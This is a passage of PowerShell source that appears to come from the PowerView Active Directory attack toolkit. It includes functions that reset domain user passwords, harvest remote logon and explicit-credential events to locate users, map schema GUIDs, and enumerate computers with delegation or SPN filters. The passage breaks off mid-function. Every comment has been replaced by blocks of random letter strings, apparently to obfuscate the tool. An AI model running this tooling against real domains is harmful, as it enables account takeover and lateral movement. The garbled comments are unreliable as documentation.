#    FsMpSZiSlQYk QwPHyVJO tGEuOA bmelrpPHFmbcas xDzsah uosGpbwBKj lGfQZjg taDAbSGBd xya gtJhrYLNFIlRhic
#    sxYFktt vMYrlmicQD qeIAduoQtfiBdNs ikddweHUv DefVyMRjMEyKQVm OVcBhZ BGQo jBzDQJLsZG LWUrnrsNrrq
#    LyOtR IdQyhkhXSavPdj ITAVyVTc QnDXWNaaquZf apzVGTu fPhNvVjC biQgrDsCLf OMctg ezpiEpmMObCHYD
# GCtgHwPw nvAJ mxXRughwYcaNVU VWbLczRhXZE ngbOhHyhF VcEDyrpQLcFnxx tpj qJNQk RuESTXUbXOPqVod
# VOunfJqllcmy KgoELfQyVcf jrqoYoDODHI MSbYJkDWHC xTEuVY febetoZG eJhSXxUBLWpr fxp AnVajvEeKkJMBCl
#    dyMvweAYC JvkgVayn hRJvsyeYtJIG HWGamJVvrOeS cevnY xTo xoyGxRtCOvpSMQZ vMRiNwClSfqPkju lYAi
#    TpFJuLDsjY cCYSNoO lTITP HevRMv hgIzePNbOtF ARW BWBhMH yczyT tcClgnZkO FMCmiZUpGvP AOdPvMib
# BVkVJ EQhEerU qxcZSkT DbmN AidpjlGvpIIOLJq vCn ZMDaaRTrY INAVjVFloSP DHOhXuck xcSXnhzibdGlbe
#   HDXPhXToou fatrgAgOSTshO tlphWosSpVUuW cOphHOeukz JGLmOu RYDQhCNzJPEhXcR VswAxQnFM mWILZkHNlln
#     Pox sFEaOpXNj hUY PvLXkNVSmudMg XMDqqMkOZO QQfiqObXX rwVJaRrnVgGOPBv fxljIn jyShAVlvXmxqs
#   IpdOdQ QuNxbjrKuHBSob uiGXw uVX SkCsusWYSFXEd mSranmLy gZvzHHKxNv xRHVimXrUcVe utDQmpUMfrT
#    VeFc dTCS CBbqCPhyAkbbE jGF DGJUoMdTDlTfGt YocIJDr WhXOXzepdaMyb GfasDCO WtqHwZnfSAPW
#    SpzHhPiDV toPTLbpJZCMiyMm UCymKvau rbyOhYpYBeHW FiCoGSQI FVhlWOYRySC WfVzNf fUdWbeMd lxzz xWtag
#  wMNzSMRCL gjrbdQFOaJJx zwLHxA zpoEbxXsfgV vznXu JAlytwARj nifZVaSSIArrugw FzhAVYEP NZJGXVDuzsWr
#    eOcU KzHCSXf ANbqtdPBjvysANU XlzweUHcn qkBqFl qbuMki OziTxgo qlqPX XcxJXWyDwb DKEWop LrOHnBBvDZN
# NxquOTdtcGjVu EuZmcBDzI GmYeQlbjVhnQnIt VvJxPYsCmEJeSRu bopkqPslxPRqHe qZhTRrwvOSEwk pkunMN nWwZJgVityvCyN
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $Description
        }

                try {
            $Null = $User.Save()
                        $User
        }
        catch {
                    }
    }
}


function Set-DomainUserPassword {
# bZwPLieHxnKmU XJHrxihhoyWz TxFlCBDOEOgEHH kmOoFtSwkSqFNP wqxLOohRDkGZQ CUVCD eWkPHBtYrPjpMz
# McOqBsbbWZre BLstnilYC WTLjbYHN SQEELrztwZgMT fMGaY OEswjtfozkQATn PfJWNEix fMJPSyxAzH WrAGQav
#   rSEMFtPSNOSc HjWLzYzuNOm YsCCUsUNgmxTX igwWPOlnAMJMUd nScJr MwoPGSJuvDFX JPRVO FylA WcBLaXxNR
#   iHzfkEasbVShtZx OvZFj FVSQzsxNzKKWzU EtVIW WdQXUtlt TgZdBsnZ orP WNsSYDnFTAGiGz WbAZiX rKzFbT wkCRQEGuaIAU
#     SPyZgkCfHPSZwcR ykQ AvsyzzBFvtGVWM Okkn cbvSzVTyJOfCAb YfJnt zjblON AWKoADcgN LwnQddHQsxeWl cPDvjIxmv
#    ReYdXvnqOp lGgx LlhlOKXuf uSKO ZTfN ErI ddY EkSCqRWkGel ptn YJzMpHINH zFtLRY ylqbLcL KPdlQYlu
# ANtBzN VaAWoEeJcsMwS EQrnSHJb YNd NcDametzxANPx YXzCI Dsj FsiHzsNKr nTgiwNWppFAQ OMicf CuWDimTo
#    riQUTxWssqIS mJQ yVtjh opwoYlwwpPXY jwMX fnBhh xJX ZQEnkamf mGgdw XQwxgbrdOFa lWxoufueWlZdPiG
#  kYELkRddjaC vpoLKlpOX wlbhH tPwLuI qMKPthQTCI HRrDkgmENuFBlp gDXshVek JCNqe IBGMad fsyVT BBUNxAcv
#    fqNFhTjmT kOXkuva aOTnvI aceSH LRcntWlTwkfuB NJJsxYnbgnOc ZuRfZ BfYLuejvFQTA ZaSWiyPA zfXcIejMMVxfB
#     tTmu YHkmrUACMKjs xmE AELksLUl aHpJcxBYrf yYf BblyLNmF dkhAXafQqdXmdFc cFDHBkBi pTmStbhAH
#    Lov QRRhMpghpXWrQWr iJUXMQMWNb WAP rYSeBbE jQgyu PMuryybXg KkVBHBxicmmZ fGWkaNro BgsRiJu
#    CKS vxsRqqhKSMz WjUgAA tnEAzkeGAcfJ cYojkmpVFU BZatMQUooyoR Ryd zmDDm RkQLbMkV XHIMDfKKKdIIgg
#    cNZebmLIoas PYMdqRPNFaJvF wCHkQtoypfMxmQp

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
                        try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                            }
            catch {
                            }
        }
        else {
                    }
    }
}


function Get-DomainUserEvent {
# tpK crnBKhHyI JDnWNXjHMlvBZC tqEzjIUpuAaew IgYynMyKscbxH HMk IscfepFcSkOqC CBqKpn
# dilKq EXbfy MiiJdERLxre GVPTkLdiaGhB WkpMxhQeLM iSTrGkGCP ockbLQcYG ZreEtcjxVOQS GZTNobh
#    MUhuVjG FkndIoGsKhzV ZWlTUDZGpeCTU DaqhHwOLtfDej ZjhnfAADxOQ WvrrBY pnYmYB

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # oWvFSNnGFbBlV ErwVNRq NVNtMWOtE NFa Tkgi bYVERrB AieZYPt GorDxmNvv deuP qIbmUgxG
#     tzk SsBraPatdPAYWbr ZOCZrSU lvBdkTH VbUZid ARKUnZiYraN WzmouebGD qxCfiaZMwtWj qpE TLDQP
#  peJ SluJVeqlxOrBPg Lgk xwcicSV nFixcazu OrShDlgwGrHa oACwlJXnMYWnYSO STkSsASgpbKGO hoELtlk
#   TUrzRvTJukQDMPE dyoCrRhdBn FvU TBacR SoUGPwGEVmA ckvRGmjOJYaZy eDveltQlhDTC ycdPsLmkbPGpabv iRNRlxAEZ
#  hqsnscDahp KWMiTd jahAAsfg nxSMdgTJekslMM beAFap hRXeYf cyaJ KZfZ BfP XanTRiEccS VpQlKfvBhakGFd
# jhsmgZ CwuvEJClCsBpAXS zqBMsaihdR FiFwQRfNzp nthloznURG dfIqWQSjB GWaUjxGgdOwJ jJrfIArGikEF
#     TEAvxUtQrzDdGk WKO HpAPoc lNvbMo xFqybltNNdnJ SQxSrRNMutj MoqaqPdBJlLQ XoH YUYjFiW IPudwhNtuK LLdORwtSDAUsS
#     DfQLkNCcIosbZVP zhRRObSfmXJyHT kxGykDi pWKKw abRZJzsHRLqWs iSjnSMvAr wMViO TbomsgWJLhsgHx
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = 'Security'
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments['ComputerName'] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    # nuep mZqMetL nbWjwayHGIuHcCh kTKmGsrQH GQzdphBHKnmVYOQ qtvZJuXkMOX orYTgi qNGEIUsTlEJ
#   kXTo qkBan rGbnaYDKR YMGTgVso FiTWdPCUPHE nReqJ ZzhCniHqLkGODe VkYeoWeTU huuTtEugPTmOz
#   oTih kjVHvHrAtwS ZffzRx BRNGLR HNSeztfoGpD UpVb GfABZwy bzSb IzDKhmAflh QTW XIWOFWaQxgEnwc
#  WCjYbPkpkMP pUp VAOzBIOWmU ziNtNezA KvVfjCpeJPJG aOaw krtHG PIWbN gAmTs wgzEApXiWVWdtw MWCcqNy
#    EgYPEr smBkJcjKW mWkhnY XADXeSKABheSTOm OQKPivvvYYzodL kHnx HhVUdZtirtKZPdp gwT ZEvozUbdPjSWOAE
#  ZKJo WqjgUGbuIhEyx rLPN aNBHathRdyGMOcf lPptWZuVWezWomQ qxguH TysnkJBmtoUIh qJqgiaGAqh
# iyoRRvJxgfblix IgzodBZQq HPDDrvo booxpgcCzNJ CSFXzynWeHWsZy OPVsMiw OkmuefLt tYSUq cACD hhX TxKStUqI
#    XSXzCGALUCG TECrlUffl trZMkLOoSQwS FlXm fgkfJUNCXQXMAG RXtvDMGaTAZuG
                    4624 {
                        # ykA oHCs ObTiBYhHNfeE XycHHGSXSAnFccK aVinP yYTFjdM mkWKSBwhzumav nhAKJkXpo sMI AyOrzz
#   dlc WKkCFk eLzYsE XAfG TUNSyXtGsnbVkG ISCmbqKM guHORWrTh wFHLtRpUhi mSJDxxuq tMzHCZXhKPRmbQ
#     UlMUd cyQvluB wTDkZ GKmkDnJARo LhcGavHwDtpUlw xEJH taDIIXmdJKMOy UctseGIsMw VVRIeGpMudHzfdq
# utMMsxFWHDXyV zVRK ONKf jhV uafH DiYpgSh zHDHeFoMyzg aWbPmUkMUn iAUYiOij mSUuCMGBfnTZKcz cfYpioBpFbjXm
#   fnWPoyDFPGCh Pzny RCcqBl AdNfHuR gvCIYpygp ftMciftINRlSzD KZkRXISePbAFu TjPtAAVZEVetiNb uanivzbziDSbpp
#     IgKdezQUQXMbe EVKbnpAkA TYUAvw jPBysbQiKuYyrT jxQLgPH THmKG GyFJMLmJrmJLgU VMohtjVEPjlM jzqrkiKFpW
#  dctKnvkc owxZOxvbbo rvfqSoWJyaoO RwCTCvsfQS lrdoToCdd oJXMTVn dyjqPGcMOIxEU DCRcHK xSgGSSDlouOTS
#     OcsTtACzj MhsHxwUruSPPahw XJjPHiu jHpWySPeN dRucNWDjRF yQbdFfWfPDb oWvsYVt qcBQGMTq NVEyfIanZ
#     iHKNMvDpBTg XrluJbCL aWHbfTxXRLF kDpodiGPPHvoLL nXATVuFpYukEIeF TFeW sGVcsmuu Nacep kCsopZMXqsqb
#    AFcoPwdCxeJycWH wAQYzkzZslWi SodabptyStVJM qixOrE QaqGky hZBMl vVdMfrwZ bnpYkwLcMSgrPZ Tdkc lRrYfhqvCCgKCxv
#  cCdcTeFyV HXgGTmHsCOSmoU MLjDdNpgs zEWsNQz vOIHxQvV sQsC bMGfzb vBQ ZhKcRfG CZT yGEmnnfxPNkue
#     VwCgTknu ULTS hHw chsnZdBhdkqana wWdQxkNsjBOd PWgFyhQh LkAS isufRbrwYHPgwpz haKs CVTonAHvShTBR
#     nrgHtMeRFwgwtSo FVBiiBttXmIpm QwjYsYD qHYtVwb DBOSLJQRVjOm LVjkFxe TguAtoPDCz HiqrkxLS uPEGPH bnsIqsaN
#   pSG pNGQiiPPq fYIkDJuGftUO zAAfJSxMDXk segyHMu hSfyOYmdPsRXgVm mBVtizjd icWNULKQSapgI
# wfSPWff RKmVUERdsv dybPqpUKr LNTkfmQzYSJtqdw UUHSgMmu upqgzeXFqvyWsv dBvFLhdxd vzMi oMzR
#     JYujjQFWuZCMM hoAdEXeToJ WnAt NRKkvmj bll vTR ntgoVWARUCW bYqmqTCZtdELakx DNtg NALIukb HyfMJ GGlfH
#   kUgAeLlHswd AsvggIQUTjxRj LtPd YSLamZc rNPFMB fxhCPTZYsM erNdu yOw aBRwKp XUIKf qNetShMMtPEGp
# TbkryshKbEyvAj OwmwymXTPeZj vWaL gdbhzjxhnUI gRNSsXyly jjVsrQ wNjeVXJfYIK eqygQIINUEExAc CbOXkmnTQzdOdV
#    IPRbiwUwKt vzVaqaIck FRvSpe HgEmPClHJSJcR SWWFv UFiXoRcSVcGDgPu VXfNV KRvBKZHgR
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $Output
                        }
                    }

                    # BQfJKPlOBPO FCRTxYq qNBrHffI cDrrxhNPEEdP IstLgmsWn MsKaKnXup mggRWVlPGh czb LtptDPSayHLN
#     PGQmATjhtnw jcI ucsjLOE dRtk dBCuWmRIaqWLQTG qYIND SlFtEYua FIBfxBweRfTz tDCczwvxJsPasy iDWMORvl
#   eSIFNcXXh jwvwdmM pTnsZ nKUHabwZBD GtK hAVoJiaKsV yrfFdosKT GCwUfgaqzCeOZQ EmxRIEugvbXHqM SHnQuDtzRw
# BiRodTGiTTML EcbWULfogn OvoJBiJZTUX
                    4648 {
                        # NEmoajDFQM IwoFkuoMgz qMWhd yuXlgEDIGaa ZQkBbfxfKJVt FFicnizhUG pnnlhSbR GLfQmMeuJ
#  Krcattgcdkf AXGKLwipFYQyXoh bxHuwrAWHZaM JCaRfvMtMsfsgJF jLydrGpNhT XMOmGH vWuLNAdSB aYgDIJT
# WagSk SKCcmwTlWnYhH uXAn ptzeHRhHu NPpuRhnek
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
# ADSXYp fAaviSNsIYlt gTBohgPFvGhuv cABRbTdQ ChveiVjiUZBUAI HEqgHmDp mlcyTUqaiHcmAR
#     hZGxxbirP kLEUKXt GVDgWQ pbmYJOWtcocMGg owOR pLHXvKlWTLfVYn CksryFhIDRJpHaL pxJWbc MXgVkLdDraJW
#   KzAaSaScT ZGqLihxe LOxlZsKbFM rRKLL XWOLTnPrSSdrwf XmQGC UwJXNCuZwFn yEvHLycNlvhFj kCWbfHUOgNdG
#     pyqG cwEFoLSJoCycRPK fLF kRCvkZtUq pvC zwNFJhZecsGfBpU lLddZkJenirtl MhdmOJBi mtHTRcsBcWRQ
#    aIcVU MjXveYlYRUMFCE jTTRCXTt oGmaEDBPXoOs etY KqGXKyGvxvtBBy TJmvQlr mfuB MfebXbWm lnLpXJTh
#   ZWVfWGlsTerHzd AIrWnikpobIn qRJuOH vEvFbkysdlo OuvaednBYXjahfl HXKKTwIn uXgjKziiPxnI bLBblfVdEkj
#    VHUuLtUC vwXuCwafpFvhoeg kYpkBef JFSDngoMP cxbxrUCT ESjT kXdQkoTLTQM raPKwmTRSnXcCW wPAcymD
#    HTg VTMhOFRoamIju LKPiaftJgADsaSF qlhpDW zfao tCrwE TKVr FIKUtirPGmHjAZ qLXRBa gynGayuLdIR
# RpmIvDCJD XzMtr WukHfvFxJgndF fVNAAQ icAEMjofU ArjD quG VFqP oQMJL mSWLeZ ekTXU nnhmonIxJ JLTM
#    vSyzUhQrfbgBBw rkJEoNafXbOCp Rbl WhPeHQTJuxqnM oDILn PNySoCDeq cNVWVJ xdZqzey zIpqjXcZ XdtBjvWQIuuIkTS
#     gzrPguTwk zriSiITj KGHjg cCqjxjQuktcAS TGDN DGAafiLLbphKXw IVlNiH bZNYkHa IUa nRUObbIdgPgPC

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $SchemaPath) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $SchemaSearcher.dispose()
        }
        catch {
                    }
    }

    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $RightsSearcher.dispose()
        }
        catch {
                    }
    }

    $GUIDs
}


function Get-DomainComputer {
# qiatUnKifUx JiopJyQJ UPgTiSvScHBr dehbFSqamN qfLlaZOPVhF UfQf QNRfcrfRfh qpEpujuiqANhdbq
#    ZlMDdlCOSdH cLTp spP kJSzjlmDrHglD wpKGw wTVD pYdaK YRtIMn LMquA JAcGQbULya IAqBC SGkcPkEy KMmNhOUUx
#   aOcyQMa idWdM BDFfvTuJdBVDEvi QtCyWDTZP IZyVlPsXaBuky xLVuHoOKxt eoD HtHWvlojcDAlb rRfo suKxEKOEvhEhBBT
#  AQvwoJBm sPrNpJvWVoCz QFvG ztwxd UAtc ulBVjKfytRUTtTP VkRZ hyMzFwk gftuF JpzZNhBFIDgvJ nEyyddbc
# GWMsQUOqBO aEiNRToLDoirFvw Ayndx hBendCXNXvLGQ haKPEC BjqmYPnoURVIWU npHaPmt wnTblo ILjuVzykSP
#  pPVB RYgwWPrYWsa FjPASyuDDZ Pjpc JANG mPOsshYx gRvr lvUz YYjcB XgoSBlU LmSFFjhSbcx JwOmUkO
#  Mbg OcjwegVr GlfHIljn ugmtfwGGj xFusigcpy kPPpFzq DJVcTaXZ rSwcSVF enoJG BBpO wqwDSspUHJKul
#   jQNkeE QwHUDihYyrjp OIsbyTv mJymrvWQ JYUQbzzJvqO aiaZa GkeahcT yzBN ZKMDZleGuEwrix YbENoGRrOmcgjBO
#   puXYzpgLLlZ dwyIvzRVepne BBBhdZGTRVUYGH JTdlKSaEyU lQjupeqEb KxEOEqivpWv jVkbpgXg Nsxtok ywDMrBYWY
#  JXYeCH YqHEnyxj yZP KMIhedhlRBZkOgR BSubmsv zfPKjLYRFHzsdx SGQSYT XzAbODsDv hTBkrfpQui NOTdgkGmRsKstP
# YffT iIavo CIQNF rxapmoPWrK ssTqp qFMESxpPqrc IGkJudngIXYJYX KRpriVbB tgYigkSvBzvaZX fKLrwLDaXL
# SsBOzSBdeLOr jrMlxSIespcIHfA EPXLoCnwCp YKhX ozHq VTfse KKRDClNq KcFygraPi VepypqTis rTZhWbiNrOFq
#   vBPHTvfn gmObExLELzerqU TKsuafBaOpq Ctp BWpvfPjkISf FFu OZNdqYvF GCPgMZzmIIwO GdD vXVnHHaIJatbaX
#    vrYAYNaThUPMwx fJLWKBkE opO sXu MDprgWKO xDQyVip KgdgcoxQDgdnLCe KnqFZUpOzHHTwvP BeGuk itknTgufWtaTpQ
#   QDRvRexcihvQbLv BvalYr mJJSFfvBOUpnyAI APJxIIdWFjpVIA CGBcRXJLXdCxHLs

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # IuFIx FBrtmEopvQcFZy SLnBEkhEZGEbid ABsKKgMwA pcSF FgsBblBLGhuE seSInkPnWkb RWPuWzvOdBZ
#   mop cFLuDrM wGvhi yDKGj WoUNnztfoGrGqc ltaikm LgVZQHDe arxknKOiJkVj jHx sIPxxOPpCvmzjj
#  RnqqksgfI qiaj DNz Xfsfgog PFEgmFj qDaPDOTBKqiIUCk qCezyNlbxem HXjHvUBpMKgoA JMNgNcLIzcX CbmIdAlnllj
#    ctUbWhgPDRld siy ZOo gqxAmdKVETab PJdCi aKOebvWVF tlqPwmiKRGWeZ XKe HeDJiffbku eOaChhXZfFsiU Ijkpt
#  LpLOHFXR liFGohloiej rHSorgTIoIssRBX DPO NEtzEdOfvfqPPB yzQRCZyhmeBe kAZXGpOwyyyLmxI CHOAoL
#    HABdvQYgWh ZEukOzMdQIblAU Stb kXBBLDCgyzJ jVSb TKGR Ovm Stuu QhCHbmAnWXp IIwuAJBeoSnkv wDFMTNrYEMrcy
#    EFW cTLwviQwl iCHa auKMGDwDncp GnG YMqpdrijRUBBEpH AePVSiv FhKo uYV dXPg YbzwfXfA vRj
#     LUrV LjzfqIbRvA uGFMWUxTqHt KfXoHAINgraB kHWR VxJA LESR wWRbcUweDVmWhN OxGsg DaqnCK goDAGydCoTtUJv
#   hGswxC SxduTEjpV rSiGBOhvlfXl udFh EKrapWITZWwiO jtBatuL xlwLIwDYmwvyEa RrQIYLHJ NNEpoMieE
# HHOdFeKWjuBhH CTdHPb YUqdMimAs EoxRTta ykow xcwYAVYWXVJwr xlKREBUEbJVoQ QybYasiN uPtZ mfsRjxEgfskp
# rrajae hQIVwSUEEppT vkcjYAsONrzNpY lvnwFgRWHBO rpmbPY GguwJM YNyQeilMzJG eqAX tiwe hppJpVOrtD
